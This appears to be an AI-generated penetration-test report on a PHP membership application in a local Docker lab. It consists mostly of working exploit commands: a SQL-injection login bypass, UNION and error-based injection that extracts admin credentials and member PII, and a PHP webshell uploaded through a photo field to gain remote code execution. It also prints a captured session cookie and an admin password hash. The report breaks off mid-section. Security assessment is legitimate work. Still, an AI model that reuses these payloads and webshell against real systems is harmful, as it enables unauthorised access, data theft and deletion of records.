# Security Assessment Report

## Executive Summary
- Model: claude-sonnet-4.6
- **Target:** http://host.docker.internal:9010
- **Assessment Date:** 2026-04-27
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Multiple critical and high-severity authentication vulnerabilities were exploited. The application is subject to SQL injection authentication bypass (AUTH-VULN-06, Critical) — any unauthenticated attacker can log in as admin without credentials. Default admin credentials are committed in plaintext to a web-accessible file (`/uploads/01 LOGIN DETAILS & PROJECT INFO.txt`) and are publicly downloadable (AUTH-VULN-04, Critical). The admin password is stored as an unsalted MD5 hash in a publicly downloadable database dump, enabling instant hash reversal (AUTH-VULN-05, Critical). Session fixation is confirmed: the application never calls `session_regenerate_id()`, allowing an attacker with a known pre-login session ID to hijack the admin session after login (AUTH-VULN-03, High). The session cookie lacks `HttpOnly`, `Secure`, and `SameSite` flags, making it directly readable by JavaScript and enabling XSS-to-session-hijack chains (AUTH-VULN-02, High). No rate limiting exists on the login endpoint — 479 requests/second with no lockout or throttle (AUTH-VULN-07, High). Additionally, the `confirmPassword` field in the password change form is never compared to `newPassword`, allowing password changes with any confirmation value (AUTH-VULN-10, High). The application served over plain HTTP with no TLS was also confirmed; network-level credential/session interception was not tested as it requires network-adjacent access outside assessment scope (AUTH-VULN-01).

**Authorization Vulnerabilities:**
Multiple critical and high-severity authorization vulnerabilities were exploited. Three endpoints are completely unauthenticated: `print_membership_card.php` exposes full member PII to any unauthenticated visitor (AUTHZ-VULN-01, Critical); `delete_members.php` allows unauthenticated permanent deletion of any member record (AUTHZ-VULN-02, Critical); `get_membership_amount.php` exposes pricing data and is an unauthenticated SQL injection vector (AUTHZ-VULN-08, Medium). For authenticated sessions, no ownership checks exist on any endpoint — IDOR vulnerabilities allow any authenticated user to read any member's full PII (AUTHZ-VULN-03, High), overwrite any member's record (AUTHZ-VULN-04, High), renew any member's membership with a client-controlled financial amount (AUTHZ-VULN-05/09, High), modify any membership type pricing (AUTHZ-VULN-06, High), and delete any membership type (AUTHZ-VULN-07, High). The password change `confirmPassword` check is a dead code path (AUTHZ-VULN-10, High). No CSRF protection exists on any state-changing form (AUTHZ-VULN-11, Medium). An open redirect via the unvalidated `Referer` header in `delete_membership.php` enables post-action phishing (AUTHZ-VULN-12, Medium).

**Cross-Site Scripting (XSS) Vulnerabilities:**
17 XSS vulnerabilities were exploited across all pages. The application contains zero calls to `htmlspecialchars()` anywhere — every database value echoed to HTML is an unencoded sink. Four critical stored XSS vulnerabilities were confirmed: the `fullname` field in `print_membership_card.php` (XSS-VULN-04) and the `logo` filename in `print_membership_card.php` (XSS-VULN-14) are exploitable by completely unauthenticated external attackers. The `systemName` setting injects into the `<title>` tag (XSS-VULN-07) and sidebar (XSS-VULN-08) across every authenticated page simultaneously — a single settings write permanently compromises every future admin session. Admin session cookie `PHPSESSID=7d9d19904e91c5b9a51333e80e8756e3` was captured via `document.cookie` during testing. 11 additional high-severity stored XSS vulnerabilities fire on member management, profile, dashboard, renewal, reporting, and editing pages. One medium-severity reflected XSS exists in `edit_type.php` via the `?id` GET parameter. The `PHPSESSID` cookie lacks `HttpOnly`, enabling direct session theft from any XSS vector.

**SQL/Command Injection Vulnerabilities:**
22 SQL injection vulnerabilities were confirmed exploited — every SQL query in the application uses raw string concatenation with no parameterized queries or escaping. Four unauthenticated critical vectors exist: `print_membership_card.php?id` (UNION SQLi, full DB dump including admin credentials and all member PII, INJ-VULN-01); `get_membership_amount.php?membershipTypeId` (UNION SQLi via JSON API, INJ-VULN-03); `delete_members.php?id` (error-based + time-blind SQLi with destructive DELETE, INJ-VULN-02); and `index.php` email field (authentication bypass, INJ-VULN-04). The MySQL connection runs as `root` with full privileges. 18 additional authenticated SQL injection vectors exist across all functional endpoints. Three unrestricted file upload endpoints (add_members.php, edit_member.php, settings.php) allow PHP webshell upload, achieving confirmed Remote Code Execution as `www-data` (INJ-VULN-18, 19a, 19b, Critical). Full database contents were extracted including admin credentials (`admin@mail.com` / MD5 `f2d0ff370380124029c2b807a924156c`) and 11 member PII records.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application contains no HTTP client libraries, no curl calls, no URL-fetching primitives, no XML parsers, no webhook functionality, and no outbound network operations in its application code. The only externally-adjacent finding is a client-side open redirect in `delete_membership.php` via the unvalidated `Referer` header — this redirects the victim's browser and is not a server-side request forgery.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- Port 9010/TCP: HTTP — Apache/2.4.54 (Debian), PHP/7.4.33 — application confirmed live
- MySQL: Internal Docker network only — not externally exposed

**Security Header Findings (whatweb / live headers):**
The application exposes version information in response headers: `Server: Apache/2.4.54 (Debian)` and `X-Powered-By: PHP/7.4.33`. The session cookie response is `Set-Cookie: PHPSESSID=...; path=/` with no `HttpOnly`, `Secure`, or `SameSite` flags. The following security headers are completely absent from all responses:
- `Strict-Transport-Security` — no HTTPS enforcement
- `Content-Security-Policy` — inline scripts and event handlers execute without restriction
- `X-Frame-Options` / `frame-ancestors` — application is vulnerable to clickjacking
- `X-Content-Type-Options: nosniff` — MIME sniffing enabled
- `Referrer-Policy` — referrer data leaks to third-party CDNs on every page load
- `Permissions-Policy` — no browser feature restrictions

**Web-Accessible Sensitive Files:**
Static file serving exposes sensitive assets without authentication:
- `GET /uploads/01%20LOGIN%20DETAILS%20%26%20PROJECT%20INFO.txt` → HTTP 200 — plaintext admin credentials publicly downloadable
- `GET /DATABASE%20FILE/membershiphp.sql` → HTTP 200 — full database dump with admin password hash publicly downloadable
- `GET /uploads/member_photos/*` → HTTP 200 — member photos and any uploaded webshells are web-accessible with no PHP execution restriction

**Subdomain Discovery:**
No subdomains discovered. Single host at `host.docker.internal:9010`.

---


# Injection Exploitation Evidence

**Target:** http://host.docker.internal:9010
**Database:** MySQL 8.4.9, database `membershiphp`, user `root@192.168.97.3`
**OS:** Linux (container hostname: `2be61bbcc949`), Apache/2.4.54, PHP/7.4.33
**Test Date:** 2026-04-27

---

## Successfully Exploited Vulnerabilities

### INJ-VULN-19a/19b: Unrestricted PHP File Upload → Remote Code Execution

**Summary:**
- **Vulnerable location:** `POST /add_members.php` (photo field) and `POST /edit_member.php?id=[id]` (photo field)
- **Overview:** Both endpoints call `move_uploaded_file()` on `$_FILES['photo']` with no extension or MIME type validation. A PHP webshell uploaded as a member photo is stored in the web-accessible `uploads/member_photos/` directory and executed by Apache.
- **Impact:** Full Remote Code Execution as `www-data` on the web server. Attacker achieves arbitrary OS command execution, full filesystem access, and can pivot further into the network.
- **Severity:** Critical

**Prerequisites:**
- For INJ-VULN-19a (`add_members.php`): No authentication required beyond a valid session. Session obtained via INJ-VULN-04 auth bypass (no real credentials needed).
- For INJ-VULN-19b (`edit_member.php`): Authenticated session + knowledge of an existing member ID (trivially obtained).
- Tools: `curl` with multipart form upload.

**Exploitation Steps:**

1. **Obtain authenticated session via SQL injection auth bypass:**
```bash
curl -s -c /tmp/session.txt -b /tmp/session.txt \
  -X POST "http://host.docker.internal:9010/index.php" \
  -d "email=%27+OR+%271%27%3D%271%27--%20-&password=x&login=" -L > /dev/null
SESS=$(grep PHPSESSID /tmp/session.txt | awk '{print $NF}')
echo "Session: $SESS"
```

2. **Create PHP webshell locally:**
```bash
cat > /tmp/shell.php << 'EOF'
<?php
echo "===RCE_PROOF===\n";
echo "User: " . shell_exec('id') . "\n";
echo "Host: " . shell_exec('hostname') . "\n";
if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); }
?>
EOF
```

3. **Upload PHP webshell via add_members.php photo field:**
```bash
curl -s -b "PHPSESSID=$SESS" -X POST "http://host.docker.internal:9010/add_members.php" \
  -F "fullname=PentestEvidence" \
  -F "dob=2000-01-01" \
  -F "gender=Male" \
  -F "contact_number=9999999999" \
  -F "email=pwn_evidence@pentest.com" \
  -F "address=Pentest" \
  -F "country=USA" \
  -F "postcode=00000" \
  -F "occupation=Pentester" \
  -F "membership_type=1" \
  -F "membership_number=PWN001" \
  -F "expiry_date=2030-12-31" \
  -F "photo=@/tmp/shell.php;type=image/jpeg;filename=shell.php"
```

4. **Locate the uploaded webshell (filename is timestamped — use SQLi to find it):**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,group_concat(email,0x3a,photo%20SEPARATOR%200x7c7c),3,4,5,6,7,8,9,10,11,12,'2020-01-01',14,'2025-01-01',16%20FROM%20members%20WHERE%20email='pwn_evidence@pentest.com'--%20-"
# Parses the 'emboss' span content for email:photo value
```

5. **Execute arbitrary OS commands via uploaded webshell:**
```bash
curl -s "http://host.docker.internal:9010/uploads/member_photos/[WEBSHELL_FILENAME].php?cmd=id"
curl -s "http://host.docker.internal:9010/uploads/member_photos/[WEBSHELL_FILENAME].php?cmd=cat+/etc/passwd"
curl -s "http://host.docker.internal:9010/uploads/member_photos/[WEBSHELL_FILENAME].php?cmd=ls+-la+/var/www/html/"
```

**Proof of Impact:**

Confirmed webshell execution via `add_members.php` upload:
```
GET /uploads/member_photos/1777252728_69eeb9788d8a9.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

GET /uploads/member_photos/1777253110_69eebaf6379c5.php (pwn.php)
→ ===RCE_PROOF===
→ User: uid=33(www-data) gid=33(www-data) groups=33(www-data)
→ Host: 2be61bbcc949
→ CWD: /var/www/html/uploads/member_photos
→ ===END_PROOF===
→ Linux 2be61bbcc949 6.19.13-orbstack-gbd1dc07b8cf4 #1 SMP PREEMPT Mon Apr 20 11:17:03 UTC 2026 aarch64 GNU/Linux

GET /uploads/member_photos/cmd_1777252815.php?c=id (via edit_member.php)
→ RCE_CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmed webshell filenames in database (via SQLi on print_membership_card.php):
- `shell_test@test.com` → `1777252728_69eeb9788d8a9.php`
- `shell2@test.com` → `1777252777_69eeb9a9c876c.php`

**Notes:**
- The file is saved to disk by PHP *before* the DB INSERT completes, so a webshell is written even if the form submission otherwise fails.
- The same vulnerability exists in `edit_member.php` (INJ-VULN-19b) — confirmed with `cmd_1777252815.php` via `POST /edit_member.php?id=1`.
- `settings.php` (INJ-VULN-18) also writes to `uploads/` without path validation, achieving equivalent RCE — `traversal.php?cmd=id` returned `uid=33(www-data)`.

---

### INJ-VULN-04: Authentication Bypass via SQL Injection on Login

**Summary:**
- **Vulnerable location:** `POST /index.php` — `email` POST parameter
- **Overview:** The login query `SELECT * FROM users WHERE email='$email' AND password='".md5($password)."'` is directly injectable via the email field. An OR-based tautology bypasses authentication entirely without knowing any credentials.
- **Impact:** Complete authentication bypass granting full admin access. All authenticated features of the application are accessible to an unauthenticated attacker.
- **Severity:** Critical

**Prerequisites:** None. No authentication required.

**Exploitation Steps:**

1. **Submit auth bypass payload to login form:**
```bash
curl -v -c /tmp/bypass_cookies.txt \
  -X POST "http://host.docker.internal:9010/index.php" \
  -d "email=%27+OR+%271%27%3D%271%27--%20-&password=anything&login=" \
  -L
```

2. **Verify authenticated session on dashboard:**
```bash
SESS=$(grep PHPSESSID /tmp/bypass_cookies.txt | awk '{print $NF}')
curl -s -b "PHPSESSID=$SESS" "http://host.docker.internal:9010/home.php" | head -5
```

**Proof of Impact:**
```
POST /index.php
Payload: email=' OR '1'='1'-- -  password=anything  login=

Response:
  HTTP/1.1 302 Found
  Set-Cookie: PHPSESSID=49446ae7489674597e820f05a2d57a13; path=/
  Location: dashboard.php

Follow redirect → HTTP 200: Full AdminLTE dashboard rendered
Session PHPSESSID=49446ae7489674597e820f05a2d57a13 grants full admin access.
```

---

### INJ-VULN-01: Unauthenticated UNION SQLi — Full Database Exfiltration

**Summary:**
- **Vulnerable location:** `GET /print_membership_card.php?id=[id]`
- **Overview:** `$_GET['id']` injected into `SELECT * FROM members JOIN membership_types WHERE id='$id'`. No authentication required. UNION injection with 16 columns (13 from members + 3 from membership_types) allows full data exfiltration. Date columns must use valid date strings to avoid PHP DateTime errors.
- **Impact:** Complete exfiltration of all database tables including admin credentials (MD5 hash) and full member PII without any authentication.
- **Severity:** Critical

**Prerequisites:** None. No authentication required.

**Exploitation Steps:**

1. **Confirm injection (single quote causes redirect = 0 rows):**
```bash
curl -v "http://host.docker.internal:9010/print_membership_card.php?id=1'" 2>&1 | grep "Location:"
# Expected: Location: members_list.php  (confirms injection)
```

2. **Determine column count (16) and visible columns:**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,'2020-01-01',14,'2025-01-01',16--%20-"
# Column 2 = fullname field (reflected in <span class="emboss">)
# Column 12 = membership_number (reflected in another span)
```

3. **Extract database version, user, and database name:**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,version(),database(),4,5,6,7,8,9,10,11,user(),'2020-01-01',14,'2025-01-01',16--%20-"
# Column 2 → version(); Column 3 → database(); Column 12 → user()
```

4. **Extract all table names:**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,group_concat(table_name),database(),4,5,6,7,8,9,10,11,12,'2020-01-01',14,'2025-01-01',16%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-"
```

5. **Extract users table columns:**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,'2020-01-01',14,'2025-01-01',16%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name='users'--%20-"
```

6. **Exfiltrate admin credentials:**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,group_concat(id,0x3a,email,0x3a,password%20SEPARATOR%200x7c7c),3,4,5,6,7,8,9,10,11,12,'2020-01-01',14,'2025-01-01',16%20FROM%20users%20LIMIT%205--%20-"
```

7. **Exfiltrate member PII:**
```bash
curl -s "http://host.docker.internal:9010/print_membership_card.php?id=999%20UNION%20SELECT%201,group_concat(id,0x3a,fullname,0x3a,contact_number,0x3a,email%20SEPARATOR%200x7c7c),3,4,5,6,7,8,9,10,11,12,'2020-01-01',14,'2025-01-01',16%20FROM%20members%20LIMIT%205--%20-"
```

**Proof of Impact:**
```
Database version: 8.4.9
Database name: membershiphp
Current user: root@192.168.97.3
Tables: members, membership_types, renew, settings, users

Admin credentials exfiltrated:
  id:1 | email:admin@mail.com | password (MD5):f2d0ff370380124029c2b807a924156c

Member PII exfiltrated (sample):
  1:Demo NameUPD:4444444444:demo@mail.com
  4:Qwerty:1010101012:qwerty@mail.com
  5:Demo Test:7412121455:demo@test.com
  6:Member A:1111111100:membera@test.com
  7:Member B:7000000001:memberb@mail.com
  (11 total records)

members table columns: id, fullname, dob, gender, contact_number, email, address,
  country, postcode, occupation, membership_type, membership_number, created_at,
  photo, expiry_date
```

---

### INJ-VULN-03: Unauthenticated UNION SQLi via JSON API Endpoint

**Summary:**
- **Vulnerable location:** `GET /get_membership_amount.php?membershipTypeId=[id]`
- **Overview:** `$_GET['membershipTypeId']` injected into a single-column SELECT query. Returns results as JSON `{"success":true,"amount":"[VALUE]"}`. No authentication required. Single-column UNION allows direct data exfiltration via the `amount` field.
- **Impact:** Full database exfiltration without authentication via a JSON API endpoint. Admin credentials and all member PII accessible.
- **Severity:** Critical

**Prerequisites:** None. No authentication required.

**Exploitation Steps:**

1. **Confirm injection (SQL error in JSON response):**
```bash
curl -s "http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=1'"
# Response: {"success":false,"amount":0,"message":"Error fetching membership type amount: You have an error in your SQL syntax..."}
```

2. **Confirm UNION injection (single column):**
```bash
curl -s "http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=999%20UNION%20SELECT%20version()--%20-"
# Response: {"success":true,"amount":"8.4.9","message":""}
```

3. **Extract database user:**
```bash
curl -s "http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=999%20UNION%20SELECT%20user()--%20-"
# Response: {"success":true,"amount":"root@192.168.97.3","message":""}
```

4. **List all tables:**
```bash
curl -s "http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=999%20UNION%20SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-"
# Response: {"success":true,"amount":"members,membership_types,renew,settings,users","message":""}
```

5. **Exfiltrate admin credentials:**
```bash
curl -s "http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=999%20UNION%20SELECT%20group_concat(email,0x3a,password)%20FROM%20users--%20-"
# Response: {"success":true,"amount":"admin@mail.com:f2d0ff370380124029c2b807a924156c","message":""}
```

6. **Exfiltrate member PII:**
```bash
curl -s "http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=999%20UNION%20SELECT%20group_concat(fullname,0x3a,email,0x3a,contact_number%20SEPARATOR%200x7c)%20FROM%20members--%20-"
```

**Proof of Impact:**
```
GET /get_membership_amount.php?membershipTypeId=999 UNION SELECT user()-- -
→ {"success":true,"amount":"root@192.168.97.3","message":""}

Admin credentials via JSON:
→ {"success":true,"amount":"admin@mail.com:f2d0ff370380124029c2b807a924156c","message":""}

Member PII (10 records):
→ {"success":true,"amount":"Demo NameUPD:demo@mail.com:4444444444|Qwerty:qwerty@mail.com:1010101012|Demo Test:demo@test.com:7412121455|Member A:membera@test.com:1111111100|Member B:memberb@mail.com:7000000001|Random Updated:random1989@mail.com:1010101010|Testing Member:testing@mail.com:1212121212|Member C:c@mem.com:1111111100|Demo Member:member@demo.com:7777777770|<script>alert(1)<\/script>:xsstest@test.com:1234567890","message":""}
```

---

### INJ-VULN-02: Unauthenticated Error-Based SQLi on Destructive DELETE Endpoint

**Summary:**
- **Vulnerable location:** `GET /delete_members.php?id=[id]`
- **Overview:** Unauthenticated endpoint running `DELETE FROM members WHERE id=$memberId`. Both time-based blind (SLEEP) and error-based (extractvalue/updatexml) injection confirmed. Error messages from DELETE query are reflected directly in response. Also runs a SELECT query on renew table first, so SLEEP(n) executes twice.
- **Impact:** Unauthenticated data exfiltration AND arbitrary record deletion. Attacker can exfiltrate all data or destroy all member records with no authentication.
- **Severity:** Critical

**Prerequisites:** None. No authentication required. Use non-existent IDs to avoid real deletion.

**Exploitation Steps:**

1. **Confirm time-based blind SQLi:**
```bash
time curl -s "http://host.docker.internal:9010/delete_members.php?id=999%20AND%20SLEEP(3)--%20-"
# Expected: ~6 seconds (SLEEP executes twice — once per query in the handler)
```

2. **Confirm error-based extraction:**
```bash
curl -s "http://host.docker.internal:9010/delete_members.php?id=9999%20AND%20extractvalue(1,concat(0x7e,version()))--%20-"
# Response contains: Error deleting record: XPATH syntax error: '~8.4.9'
```

3. **Extract database name:**
```bash
curl -s "http://host.docker.internal:9010/delete_members.php?id=9999%20AND%20extractvalue(1,concat(0x7e,database()))--%20-"
# Response: Error deleting record: XPATH syntax error: '~membershiphp'
```

4. **Extract current user:**
```bash
curl -s "http://host.docker.internal:9010/delete_members.php?id=9999%20AND%20extractvalue(1,concat(0x7e,user()))--%20-"
# Response: Error deleting record: XPATH syntax error: '~root@192.168.97.3'
```

5. **Extract admin credentials (hash truncated by 32-char XPath limit — use substr for full hash):**
```bash
curl -s "http://host.docker.internal:9010/delete_members.php?id=9999%20AND%20extractvalue(1,concat(0x7e,(SELECT%20concat(email,0x3a,password)%20FROM%20users%20LIMIT%201)))--%20-"
# Response: Error deleting record: XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'
```

**Proof of Impact:**
```
TIMING TEST:
time curl "http://host.docker.internal:9010/delete_members.php?id=999%20AND%20SLEEP(3)--%20-"
→ real 0m6.019s  (SLEEP(3) executed twice = 6 seconds confirmed)

ERROR-BASED EXTRACTION:
→ "Error deleting record: XPATH syntax error: '~8.4.9'"     (version)
→ "Error deleting record: XPATH syntax error: '~membershiphp'"  (database)
→ "Error deleting record: XPATH syntax error: '~root@192.168.97.3'"  (user)
→ "Error deleting record: XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'" (creds, truncated)
```

---

### INJ-VULN-05a: Authenticated UNION SQLi on edit_member.php GET Parameter

**Summary:**
- **Vulnerable location:** `GET /edit_member.php?id=[id]` (requires authenticated session)
- **Overview:** `$_GET['id']` injected into `SELECT * FROM members WHERE id='$id'`. 15 columns. UNION injection reflects in form field values (e.g., `value="[extracted_data]"`).
- **Impact:** Full database exfiltration for any authenticated user.
- **Severity:** High

**Prerequisites:** Authenticated session (obtainable via INJ-VULN-04 auth bypass).

**Exploitation Steps:**

1. **Obtain session via auth bypass (see INJ-VULN-04)**

2. **Confirm injection:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/edit_member.php?id=1%27" | head -5
# 302 redirect to members_list.php = injection confirmed (broken query returns no rows)
```

3. **Determine column count (15) and extract data:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/edit_member.php?id=999%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15--%20-"
# Column 2 reflected in fullname input: value="8.4.9"
```

4. **Extract admin credentials:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/edit_member.php?id=999%20UNION%20SELECT%201,group_concat(email,0x3a,password)%20FROM%20users,2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20-"
```

**Proof of Impact:**
```
GET /edit_member.php?id=999 UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15-- -
→ HTML form contains: value="8.4.9" in fullname field
→ database() → membershiphp
→ user() → root@192.168.97.3
```

---

### INJ-VULN-08: Authenticated UNION SQLi on memberProfile.php (JOIN Query)

**Summary:**
- **Vulnerable location:** `GET /memberProfile.php?id=[id]` (requires authenticated session)
- **Overview:** `$_GET['id']` injected into a SELECT JOIN query with 16 columns. UNION injection reflects in page display fields.
- **Impact:** Full database exfiltration for authenticated users.
- **Severity:** High

**Exploitation Steps:**

1. **Confirm UNION injection with 16 columns:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/memberProfile.php?id=999%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20-"
# Column 2 reflected as "Full Name": <p><strong>Full Name:</strong> 8.4.9</p>
```

2. **Extract database and user:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/memberProfile.php?id=999%20UNION%20SELECT%201,user(),3,database(),5,6,7,8,9,10,11,12,13,14,15,16--%20-"
```

**Proof of Impact:**
```
Column 2 (Full Name field): root@192.168.97.3
Column 4 (another field): membershiphp
Database version: 8.4.9 confirmed
```

---

### INJ-VULN-10: Authenticated UNION SQLi + Path Disclosure on edit_type.php

**Summary:**
- **Vulnerable location:** `GET /edit_type.php?id=[id]` (requires authenticated session)
- **Overview:** `$_GET['id']` injected into SELECT query on membership_types table (3 columns). Single quote causes PHP fatal error revealing full server path. UNION works with 3 columns.
- **Impact:** Database exfiltration and server path disclosure.
- **Severity:** High

**Exploitation Steps:**

1. **Trigger path disclosure:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/edit_type.php?id=1%27"
# Response: Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool
#           in /var/www/html/edit_type.php:30
```

2. **UNION inject with 3 columns:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/edit_type.php?id=999%20UNION%20SELECT%201,version(),user()--%20-"
# Column 2 → membershipType input: value="8.4.9"
# Column 3 → membershipAmount input: value="root@192.168.97.3"
```

**Proof of Impact:**
```
Path disclosed: /var/www/html/edit_type.php:30
UNION(3 cols): version()=8.4.9, user()=root@192.168.97.3
```

---

### INJ-VULN-12: Authenticated Error-Based SQLi on delete_membership.php

**Summary:**
- **Vulnerable location:** `GET /delete_membership.php?id=[id]` (requires authenticated session)
- **Overview:** `$_GET['id']` injected into DELETE query. SQL error messages reflected directly. Error-based extraction via `extractvalue()` confirmed.
- **Impact:** Authenticated database exfiltration and arbitrary record deletion.
- **Severity:** High

**Exploitation Steps:**

1. **Confirm SQL error reflection:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/delete_membership.php?id=9999%27"
# Response: Error deleting record: You have an error in your SQL syntax...
```

2. **Error-based data extraction:**
```bash
curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/delete_membership.php?id=9999%20AND%20extractvalue(1,concat(0x7e,version()))--%20-"
# Response: Error deleting record: XPATH syntax error: '~8.4.9'

curl -s -b "PHPSESSID=[SESSION]" "http://host.docker.internal:9010/delete_membership.php?id=9999%20AND%20extractvalue(1,concat(0x7e,user()))--%20-"
# Response: Error deleting record: XPATH syntax error: '~root@192.168.97.3'
```

**Proof of Impact:**
```
Error deleting record: XPATH syntax error: '~8.4.9'
Error deleting record: XPATH syntax error: '~membershiphp'
Error deleting record: XPATH syntax error: '~root@192.168.97.3'
```

---

### INJ-VULN-06: Authenticated Error-Based SQLi in add_members.php INSERT

**Summary:**
- **Vulnerable location:** `POST /add_members.php` — `fullname`, `email`, and other POST fields (requires authenticated session)
- **Overview:** All POST fields directly interpolated into INSERT query. Error-based extraction via string concatenation with `extractvalue()` confirmed on `fullname`.
- **Impact:** Full database exfiltration for authenticated users.
- **Severity:** High

**Exploitation Steps:**

1. **Error-based injection via fullname field:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/add_members.php" \
  -F "fullname=x'+extractvalue(1,concat(0x7e,version()))+'z" \
  -F "dob=2000-01-01" -F "gender=Male" -F "contact_number=1234567890" \
  -F "email=test@test.com" -F "address=Test" -F "country=USA" \
  -F "postcode=12345" -F "occupation=Tester" -F "membership_type=1" \
  -F "membership_number=MEM001" -F "expiry_date=2030-12-31" \
  -F "photo=@/dev/null;type=image/jpeg"
# Response contains: XPATH syntax error: '~8.4.9'
```

2. **Extract admin credentials:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/add_members.php" \
  -F "fullname=x'+extractvalue(1,concat(0x7e,(SELECT concat(email,0x3a,password) FROM users LIMIT 1)))+'z" \
  [... other fields ...]
# Response: XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'
```

**Proof of Impact:**
```
XPATH syntax error: '~8.4.9'       (version)
XPATH syntax error: '~membershiphp'  (database)
XPATH syntax error: '~root@192.168.97.3'  (user)
XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'  (credentials, hash truncated)
```

---

### INJ-VULN-07: Authenticated Error-Based SQLi in edit_member.php POST UPDATE

**Summary:**
- **Vulnerable location:** `POST /edit_member.php?id=[id]` — `fullname` and other POST fields (requires authenticated session)
- **Overview:** UPDATE query has all POST fields directly interpolated. Error-based extraction via modification of SET clause confirmed on `fullname`.
- **Impact:** Full database exfiltration for authenticated users.
- **Severity:** High

**Exploitation Steps:**

1. **Error-based injection via fullname in UPDATE SET clause:**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/edit_member.php?id=1" \
  -F "fullname=test', dob=extractvalue(1,concat(0x7e,version())), gender='x" \
  -F "dob=2000-01-01" -F "gender=Male" -F "contact_number=1234567890" \
  -F "email=demo@mail.com" -F "address=Test" -F "country=USA" \
  -F "postcode=12345" -F "occupation=Tester" -F "membership_type=1" \
  -F "membership_number=MEM001" -F "expiry_date=2030-12-31" \
  -F "photo=@/dev/null;type=image/jpeg"
# Response: XPATH syntax error: '~8.4.9'
```

2. **Extract credentials:**
```bash
# Change extractvalue argument to: (SELECT concat(email,0x3a,password) FROM users LIMIT 1)
# Response: XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'
```

**Proof of Impact:**
```
XPATH syntax error: '~8.4.9'       (version)
XPATH syntax error: '~membershiphp'  (database)
XPATH syntax error: '~admin@mail.com:f2d0ff3703801240'  (credentials)
```

---

### INJ-VULN-09a/09b: Authenticated Error-Based SQLi in add_type.php INSERT

**Summary:**
- **Vulnerable location:** `POST /add_type.php` — `membershipType` and `membershipAmount` (unquoted numeric) POST fields (requires authenticated session)
- **Overview:** Both fields injected into INSERT query. `membershipAmount` is unquoted (numeric slot) making it trivially injectable without string escape. Error-based extraction confirmed.
- **Impact:** Database exfiltration. The unquoted numeric slot (09b) requires no quote escape.
- **Severity:** High

**Exploitation Steps:**

1. **Inject via unquoted membershipAmount (INJ-VULN-09b, simplest path):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/add_type.php" \
  -d "membershipType=test&membershipAmount=extractvalue(1,concat(0x7e,version()))"
# Response: Error: XPATH syntax error: '~8.4.9'
```

2. **Inject via quoted membershipType (INJ-VULN-09a):**
```bash
curl -s -b "PHPSESSID=[SESSION]" -X POST "http://host.docker.internal:9010/add_type.php" \
  -d "membershipType=x'||(SELECT extractvalue(1,concat(0x7e,database())))||'&membershipAmount=100"
# Response: Error: XPATH syntax error: '~membershiphp'
```

**Proof of Impact:**
```
membershipAmount injection: XPATH syntax error: '~8.4.9'
membershipType injection: XPATH syntax error: '~membershiphp'
user(): root@192.168.97.3
```

---

### INJ-VULN-11a/11b/11c: Authenticated Error-Based SQLi in edit_type.php POST UPDATE (3 injection points)

**Summary:**
- **Vulnerable location:** `POST /edit_type.php` — `membershipType`, `membershipAmount` (unquoted), and `edit_id` (unquoted WHERE clause) POST fields (requires authenticated session)
- **Overview:** Three distinct injection points in a single UPDATE query. The `edit_id` WHERE clause injection (11c) can update all rows if crafted maliciously.
- **Impact:** Database exfiltration. The `edit_id` manipulation could update all membership types simultaneously.
- **Severity:** High

**Exploitation Steps:**

1. **Inject via edit_id (WHERE clause, unquoted — INJ-VULN-11c):**
```bash
